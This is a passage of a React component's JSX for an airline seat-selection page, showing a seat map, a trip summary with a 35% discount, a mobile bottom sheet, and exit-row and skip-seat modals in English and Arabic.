              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" /></svg>
            </button>
            <h1 className="text-xl md:text-4xl lg:text-5xl font-extrabold text-[#0a72c0] tracking-tight">{t('seat.title')}</h1>
          </div>
          <div className="flex items-center gap-3">
            <div className="bg-white border border-[#d7e3f2] rounded-xl px-4 py-2.5 flex items-center gap-2 shadow-sm text-[#0a2540] font-semibold">
              <span>{summary.originCode || 'KWI'}</span>
              <svg className="w-5 h-5 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
              <span>{summary.destCode || 'HBE'}</span>
              <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
            </div>
            <div className="w-12 h-12 rounded-full bg-[#0a4c95] flex items-center justify-center text-white font-bold shadow-sm">J9</div>
          </div>
        </div>

        {/* ===== TABS: Seats | Meals ===== */}
        <div className="flex border-b-2 border-[#d7e3f2] mb-5">
          <button
            onClick={() => setTab('seats')}
            className={`flex-1 pb-3 text-[17px] font-bold text-center ${tab === 'seats' ? 'text-[#0a72c0] border-b-[3px] border-[#0a72c0]' : 'text-[#8a99a8]'}`}
          >
            {t('seat.seats')}
          </button>
          <button
            onClick={handleContinue}
            className={`flex-1 pb-3 text-[17px] font-bold text-center ${tab === 'meals' ? 'text-[#0a72c0] border-b-[3px] border-[#0a72c0]' : 'text-[#8a99a8]'}`}
          >
            {t('seat.meals')}
          </button>
        </div>

        <div className="flex flex-col lg:flex-row gap-6 items-start">
          {/* Left: seat map / meals */}
          <div className="flex-1 w-full">
            {/* Passenger indicator (small people icon) - mobile only */}
            <div className="md:hidden flex items-center gap-2 mb-4">
              <svg className="w-6 h-6 text-[#0a4c95]" fill="currentColor" viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z" /></svg>
            </div>

            {/* Desktop: Passenger chips */}
            <div className="hidden md:flex mb-5 flex-wrap gap-3">
              {people.map((_, i) => {
                const seat = assignments[i];
                const isActive = activePax === i;
                return (
                  <button
                    key={i}
                    type="button"
                    onClick={() => setActivePax(i)}
                    className={`inline-flex items-center gap-2 font-semibold rounded-full px-5 py-2 text-sm border transition-colors ${
                      isActive
                        ? 'bg-[#cfe6fb] text-[#0a4c95] border-[#9fcdf2]'
                        : 'bg-white text-[#0a4c95] border-[#d7e3f2] hover:bg-[#f3f8ff]'
                    }`}
                  >
                    {seat ? `${seat} | ${paxName(i)}` : paxName(i)}
                    {seat && (
                      <span
                        role="button"
                        tabIndex={0}
                        aria-label="Remove seat"
                        onClick={(e) => { e.stopPropagation(); removeSeat(i); }}
                        className="text-[#0a4c95] hover:text-[#06325f] cursor-pointer"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
                      </span>
                    )}
                  </button>
                );
              })}
            </div>

            {tab === 'seats' ? (
              <div className="flex flex-col md:flex-row gap-6">
                {/* Zone legend cards - DESKTOP ONLY */}
                <div className="hidden md:block w-64 space-y-3 shrink-0">
                  {ZONES.map((z) => (
                    <button key={z.id} type="button" onClick={() => handleZoneClick(z.id)} className={`w-full ${isAr ? 'text-right' : 'text-left'} bg-white rounded-2xl shadow-sm border px-4 py-3 flex items-center justify-between transition-colors hover:bg-[#f3f8ff] ${openZone === z.id ? 'border-[#0a72c0] ring-1 ring-[#0a72c0]' : 'border-[#e6eef7]'}`}>
                      <div className="flex items-center gap-3">
                        {z.id === 'extraLegroom' ? (
                          <span className="w-9 h-9 rounded-lg flex items-center justify-center" style={{ background: z.swatch }}>
                            <svg width="19" height="16" viewBox="0 0 19 16" className="w-5 h-[17px]" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9.625 12.25H1.75C1.26875 12.25 0.856771 12.0786 0.514063 11.7359C0.171354 11.3932 0 10.9812 0 10.5V0H1.75V10.5H9.625V12.25ZM14.35 15.75L11.375 9.625H5.6875C4.95833 9.625 4.33854 9.36979 3.82813 8.85938C3.31771 8.34896 3.0625 7.72917 3.0625 7V0H8.3125V5.25H10.9375C11.2729 5.25 11.5792 5.34115 11.8563 5.52344C12.1333 5.70573 12.3521 5.95 12.5125 6.25625L15.4875 12.3375L16.45 11.9C16.7854 11.7396 17.1245 11.7141 17.4672 11.8234C17.8099 11.9328 18.0688 12.1479 18.2438 12.4688C18.4188 12.8042 18.4443 13.1469 18.3203 13.4969C18.1964 13.8469 17.9667 14.1021 17.6313 14.2625L14.35 15.75Z" fill="#12470D" /></svg>
                          </span>
                        ) : (
                          <span className="w-9 h-9 rounded-lg" style={{ background: z.swatch }} />
                        )}
                        <div>
                          <div className="text-[#0a2540] font-bold text-sm leading-tight">{zoneLabel(z)}</div>
                          <div className="text-[#8a99a8] text-xs">{zoneRowsText(z)}</div>
                        </div>
                      </div>
                      <svg className={`w-4 h-4 text-[#0a72c0] transition-transform ${openZone === z.id ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                    </button>
                  ))}
                </div>

                {/* Seat map */}
                <div className="flex-1">
                  {/* Aircraft front */}
                  <div className="flex items-center gap-3 mb-3">
                    <svg className="w-4 h-4 text-[#0a4c95]" fill="currentColor" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6z" /></svg>
                    <Divider />
                    <span className="text-[#5b6b7b] text-sm font-medium">{t('seat.aircraftFront')}</span>
                    <Divider />
                    <svg className="w-4 h-4 text-[#0a4c95]" fill="currentColor" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6z" /></svg>
                  </div>

                  {/* Column headers */}
                  <div className="flex items-center justify-center gap-1.5 md:gap-2 mb-3">
                    <div className="flex gap-1.5 md:gap-2">
                      {['A', 'B', 'C'].map((c) => <div key={c} className="w-10 md:w-11 text-center text-sm font-bold text-[#0a4c95]">{c}</div>)}
                    </div>
                    <div className="w-8 md:w-10" />
                    <div className="flex gap-1.5 md:gap-2">
                      {['D', 'E', 'F'].map((c) => <div key={c} className="w-10 md:w-11 text-center text-sm font-bold text-[#0a4c95]">{c}</div>)}
                    </div>
                  </div>

                  {/* Zones */}
                  {ZONES.map((z) => {
                    const zoneFree = isZoneFree(fareType, z.id);
                    const bannerText = zoneFree
                      ? zoneBanner(z)
                      : `${zoneBanner(z)} (${summary.curCode} ${(SEAT_PRICES_KWD[z.id].mid * summary.curRate).toLocaleString('en-US', { minimumFractionDigits: summary.curDecimals, maximumFractionDigits: summary.curDecimals })}+)`;
                    return (
                      <div key={z.id} ref={(el) => { zoneRefs.current[z.id] = el; }} className="scroll-mt-24">
                        {banner(bannerText)}
                        <div className="space-y-2">
                          {z.rows.map((row) => renderRow(row))}
                        </div>
                      </div>
                    );
                  })}

                  {/* Bottom column headers */}
                  <div className="flex items-center justify-center gap-1.5 md:gap-2 mt-3">
                    <div className="flex gap-1.5 md:gap-2">
                      {['A', 'B', 'C'].map((c) => <div key={c} className="w-10 md:w-11 text-center text-sm font-bold text-[#0a4c95]">{c}</div>)}
                    </div>
                    <div className="w-8 md:w-10" />
                    <div className="flex gap-1.5 md:gap-2">
                      {['D', 'E', 'F'].map((c) => <div key={c} className="w-10 md:w-11 text-center text-sm font-bold text-[#0a4c95]">{c}</div>)}
                    </div>
                  </div>

                  {/* Aircraft back */}
                  <div className="flex items-center gap-3 mt-3">
                    <svg className="w-4 h-4 text-[#0a4c95]" fill="currentColor" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6z" /></svg>
                    <Divider />
                    <span className="text-[#5b6b7b] text-sm font-medium">{isAr ? 'مؤخرة الطائرة' : 'Aircraft Back'}</span>
                    <Divider />
                    <svg className="w-4 h-4 text-[#0a4c95]" fill="currentColor" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6z" /></svg>
                  </div>
                </div>
              </div>
            ) : (
              <MealsTab isAr={isAr} t={t} summary={summary} />
            )}
          </div>

          {/* Right: trip summary - DESKTOP ONLY */}
          <div className="hidden lg:block w-96">
            <div className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] p-6 sticky top-6">
              <h2 className="text-2xl font-extrabold text-[#0a72c0] mb-4">{t('seat.tripSummary')}</h2>

              <div className="flex items-center gap-2 text-[#0a2540] mb-2">
                <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                {summary.passengerCount} {summary.passengerCount > 1 ? t('common.passengers') : t('common.passenger')}
              </div>
              <div className="flex items-center gap-2 text-[#0a2540] mb-5">
                <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                {summary.tripLabel}: {summary.firstDate}
              </div>

              {/* Flights (expandable) */}
              <div className="bg-[#f4f7fb] rounded-xl mb-3">
                <button type="button" onClick={() => setFlightsOpen((o) => !o)} className="w-full flex items-center justify-between px-4 py-4">
                  <span className="text-[#0a2540] font-medium">{t('seat.flights')}</span>
                  <span className="flex items-center gap-2">
                    <span className="text-[#0a72c0] font-semibold">{fmt(summary.flightsConv, summary)}</span>
                    <svg className={`w-4 h-4 text-[#0a72c0] transition-transform ${flightsOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                  </span>
                </button>
                {flightsOpen && (
                  <div className="px-4 pb-4 border-t border-[#e3eaf2] pt-3 space-y-3">
                    {(summary.legs || []).map((leg, i) => (
                      <div key={i} className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[#0a2540] font-semibold">{leg.route}</span>
                          <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 15l7-7 7 7" /></svg>
                        </div>
                        {leg.detail && <div className="text-xs text-[#5b6b7b]">{leg.detail}</div>}
                        <div className="bg-[#eef3f9] rounded-lg text-center py-2 text-[#0a2540] text-sm">{bundle}</div>
                      </div>
                    ))}
                    <div className="flex items-center justify-between pt-1">
                      <span className="text-[#0a2540] font-semibold">{bundle}</span>
                      <span className="text-[#0a2540] font-semibold">{fmt(summary.flightsConv, summary)}</span>
                    </div>
                    {/* Meals */}
                    <div className="flex items-center justify-between pt-2 border-t border-[#e3eaf2]">
                      <span className="flex items-center gap-2 text-[#0a2540] font-semibold">
                        <svg className="w-5 h-5 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M11 9H9V2H7v7H5V2H3v7c0 2.1 1.6 3.8 3.6 4v7h2v-7c2-.2 3.6-1.9 3.6-4V2h-2v7zm5-3v8h2v8h2V2c-2.2 0-4 1.8-4 4z" /></svg>
                        {t('seat.meals')}
                      </span>
                      <span className="text-[#0a2540]">{summary.curCode} 0.000</span>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-[#5b6b7b]">{isAr ? 'وجبة × 1 – ساندوتش حلومي + رقائق + مشروب غازي + ماء' : '1 x Meal Sandwich - Halloumi + Chips+ soda+water'}</span>
                      <span className="text-[#0a72c0] font-medium whitespace-nowrap">{t('common.included')}</span>
                    </div>
                    {/* Baggage */}
                    <div className="flex items-center justify-between pt-2 border-t border-[#e3eaf2]">
                      <span className="flex items-center gap-2 text-[#0a2540] font-semibold">
                        <svg className="w-5 h-5 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M17 6h-2V3a1 1 0 00-1-1h-4a1 1 0 00-1 1v3H7a2 2 0 00-2 2v11a2 2 0 002 2h10a2 2 0 002-2V8a2 2 0 00-2-2zm-6-2h2v2h-2V4z" /></svg>
                        {t('seat.baggage')}
                      </span>
                      <span className="text-[#0a72c0] font-medium">{t('common.included')}</span>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-[#5b6b7b]">{isAr ? 'أمتعة المقصورة 7 كغ × 1' : '1 X Cabin baggage 7 Kg'}</span>
                      <span className="text-[#0a72c0] font-medium">{t('common.included')}</span>
                    </div>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-[#5b6b7b]">{isAr ? 'أمتعة مسجلة 40 كغ × 1' : '1 X Checked baggage 40 Kg'}</span>
                      <span className="text-[#0a72c0] font-medium">{t('common.included')}</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Taxes */}
              <div className="bg-[#f4f7fb] rounded-xl mb-3 flex items-center justify-between px-4 py-4">
                <span className="text-[#0a2540] font-medium">{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span className="text-[#5b6b7b]">{fmt(summary.taxesConv, summary)}</span>
              </div>

              {summary.cfarConv > 0 && (
                <div className="bg-[#f4f7fb] rounded-xl mb-3 flex items-center justify-between px-4 py-3">
                  <span className="text-[#0a2540] font-medium">{isAr ? 'الإلغاء لأي سبب' : 'Cancel for Any Reason'}</span>
                  <span className="text-[#5b6b7b]">{fmt(summary.cfarConv, summary)}</span>
                </div>
              )}

              {anySeatSelected && (
                <div className="bg-[#f4f7fb] rounded-xl mb-3 px-4 py-3">
                  <div className="flex items-center justify-between">
                    <span className="flex items-center gap-2 text-[#0a2540] font-semibold">
                      <svg className="w-5 h-5 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M4 18V6h2v10h3V8h2v8h7v2z" /></svg>
                      {t('seat.seating')}
                    </span>
                    <span className="text-[#0a2540]">{fmt(seatConv, summary)}</span>
                  </div>
                  {people.map((_, i) => {
                    const seat = assignments[i];
                    if (!seat) return null;
                    const zone = zoneForRow(parseInt(seat.slice(0, -1), 10));
                    const lineConv = getSeatPriceConv(seat);
                    return (
                      <div key={i} className="flex items-center justify-between text-sm mt-1">
                        <span className="text-[#5b6b7b]">{seat} – {zoneBanner(zone)}</span>
                        <span className="font-medium whitespace-nowrap text-[#0a2540]">{fmt(lineConv, summary)}</span>
                      </div>
                    );
                  })}
                </div>
              )}

              {/* Discount */}
              <div className="bg-[#fdeaea] rounded-xl mb-3 flex items-center justify-between px-4 py-3">
                <span className="text-[#c0392b] font-semibold">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b] font-semibold">- {fmt(discountAmount, summary)}</span>
              </div>

              <div className="flex items-center justify-between mt-4 mb-5">
                <span className="text-xl text-[#0a2540]">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-sm line-through text-red-500">{fmt(Math.round((totalConv + discountAmount) * f) / f, summary)}</span>
                  <span className="text-xl font-extrabold text-[#0a72c0]">{fmt(totalConv, summary)}</span>
                </span>
              </div>

              <button
                type="button"
                onClick={() => setShowSkipModal(true)}
                className="w-full text-[#0a72c0] font-semibold mb-3 hover:underline"
              >
                {t('seat.skipSeats')}
              </button>
              <button
                type="button"
                onClick={() => { if (anySeatSelected) { handleContinue(); } else { setShowSkipModal(true); } }}
                className="w-full bg-[#0a4c95] hover:bg-[#083d7a] text-white rounded-full py-4 font-bold text-lg shadow-sm"
              >
                {t('common.continue')}
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* ===== MOBILE BOTTOM SHEET (matches original screenshot exactly) ===== */}
      <div className="lg:hidden fixed bottom-0 left-0 right-0 z-[9999] transition-all duration-300" style={{ transform: bottomBarVisible ? 'translateY(0)' : 'translateY(110%)' }}>
        {/* Expanded overlay */}
        {summaryOpen && (
          <div className="fixed inset-0 bg-black/20 z-[9998]" onClick={() => setSummaryOpen(false)} />
        )}
        <div className={`relative z-[9999] bg-white rounded-t-3xl shadow-[0_-4px_20px_rgba(0,0,0,0.12)] transition-all duration-300 ${summaryOpen ? 'max-h-[75vh] overflow-y-auto' : ''}`}>
          <div className="px-5 pt-4 pb-5">
            {/* Seat chips (selected seats) */}
            {anySeatSelected && (
              <div className="flex flex-wrap gap-2 mb-3">
                {people.map((_, i) => {
                  const seat = assignments[i];
                  if (!seat) return null;
                  return (
                    <span
                      key={i}
                      className="inline-flex items-center gap-2 bg-[#f0f5fb] border border-[#d7e3f2] rounded-full px-4 py-2 text-[14px] font-semibold text-[#0a2540]"
                    >
                      {seat} | {paxName(i)}
                      <button
                        type="button"
                        onClick={() => removeSeat(i)}
                        className="text-[#5b6b7b] hover:text-[#0a2540]"
                        aria-label="Remove seat"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
                      </button>
                    </span>
                  );
                })}
              </div>
            )}

            {/* Total for seats */}
            <div className="flex items-center justify-between mb-1">
              <div>
                <p className="text-[13px] text-[#5b6b7b]">{isAr ? 'الإجمالي (للمقاعد)' : 'Total (For seats)'}</p>
                <p className="text-[20px] font-extrabold text-[#0a72c0]">{fmt(seatConv, summary)}</p>
                <button
                  type="button"
                  onClick={() => setSummaryOpen((o) => !o)}
                  className="text-[14px] font-semibold text-[#0a72c0] underline"
                >
                  {t('seat.tripSummary')}
                </button>
              </div>
              <button
                type="button"
                onClick={() => { if (anySeatSelected) { handleContinue(); } else { setShowSkipModal(true); } }}
                className="bg-[#0a4c95] hover:bg-[#083d7a] text-white rounded-full px-10 py-4 font-bold text-[17px] shadow-sm"
              >
                {t('common.continue')}
              </button>
            </div>

            {/* Expanded trip summary */}
            {summaryOpen && (
              <div className="mt-4 pt-4 border-t border-[#e3eaf2]">
                <h3 className="text-lg font-extrabold text-[#0a72c0] mb-3">{t('seat.tripSummary')}</h3>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between"><span className="text-[#5b6b7b]">{t('seat.flights')}</span><span className="text-[#0a2540] font-semibold">{fmt(summary.flightsConv, summary)}</span></div>
                  <div className="flex justify-between"><span className="text-[#5b6b7b]">{isAr ? 'الضرائب' : 'Taxes'}</span><span className="text-[#0a2540] font-semibold">{fmt(summary.taxesConv, summary)}</span></div>
                  {summary.cfarConv > 0 && <div className="flex justify-between"><span className="text-[#5b6b7b]">{isAr ? 'الإلغاء لأي سبب' : 'CFAR'}</span><span className="text-[#0a2540] font-semibold">{fmt(summary.cfarConv, summary)}</span></div>}
                  {anySeatSelected && <div className="flex justify-between"><span className="text-[#5b6b7b]">{t('seat.seating')}</span><span className="text-[#0a2540] font-semibold">{fmt(seatConv, summary)}</span></div>}
                  <div className="flex justify-between text-[#c0392b]"><span>{isAr ? 'خصم 35%' : 'Discount 35%'}</span><span className="font-semibold">- {fmt(discountAmount, summary)}</span></div>
                  <div className="flex justify-between pt-2 border-t border-[#e3eaf2]">
                    <span className="text-[#0a2540] font-bold">{t('common.total')}</span>
                    <span className="text-[#0a72c0] font-extrabold">{fmt(totalConv, summary)}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Exit-row safety confirmation modal (rows 12-13) */}
      {pendingSeat && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a2c6e]/70 px-4">
          <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg p-7 relative">
            <button
              onClick={() => setPendingSeat(null)}
              aria-label="Close"
              className="absolute top-4 right-4 text-[#8a99a8] hover:text-[#0a2540]"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
            </button>
            <h3 className="text-2xl font-extrabold text-[#0a2540] mb-5 pr-6">{isAr ? 'تحقق سريع قبل اختيار مقعد صف الخروج' : 'Quick check before you pick that sweet exit row seat'}</h3>
            <p className="text-[#0a2540] font-medium mb-3">{isAr ? 'باختيار هذا المقعد، أنت تؤكد أن:' : 'By selecting this seat, you confirm that:'}</p>
            <ul className="list-disc pl-5 space-y-2 text-[#5b6b7b] text-sm mb-7">
              {(isAr ? ['عمرك 18 سنة على الأقل.', 'لست حاملاً حالياً.', 'لست مستخدماً لكرسي متحرك.', 'لا تسافر مع رضع أو أطفال صغار.', 'تمتلك القدرة والقوة والمرونة الكافية في الذراعين والساقين للمساعدة في الإخلاء الطارئ عند الحاجة.'] : ['You are at least 18 years of age.', 'You are not currently pregnant.', 'You are not a wheelchair user.', 'You are not traveling with infants or young children.', 'You have sufficient mobility, strength, and dexterity in both arms and legs to assist in an emergency evacuation, if required.']).map((line, idx) => (<li key={idx}>{line}</li>))}
            </ul>
            <div className="flex items-center gap-4">
              <button
                onClick={() => setPendingSeat(null)}
                className="flex-1 border border-[#0a4c95] text-[#0a4c95] rounded-full py-3 font-bold hover:bg-[#f3f8ff]"
              >
                {t('common.cancel')}
              </button>
              <button
                onClick={() => { if (pendingSeat) assignSeatToActive(pendingSeat); setPendingSeat(null); }}
                className="flex-1 bg-[#f5c518] hover:bg-[#e3b510] text-[#0a2540] rounded-full py-3 font-bold"
              >
                {isAr ? 'أوافق' : 'I agree'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Skip-seat warning modal */}
      {showSkipModal && (
        <SkipSeatModal
          isAr={isAr}
          t={t}
          onSelectSeat={() => setShowSkipModal(false)}
          onContinueWithout={() => { setAssignments({}); setShowSkipModal(false); handleContinue(); }}
        />
      )}
    </div>
  );
};

export default SeatCustomization;
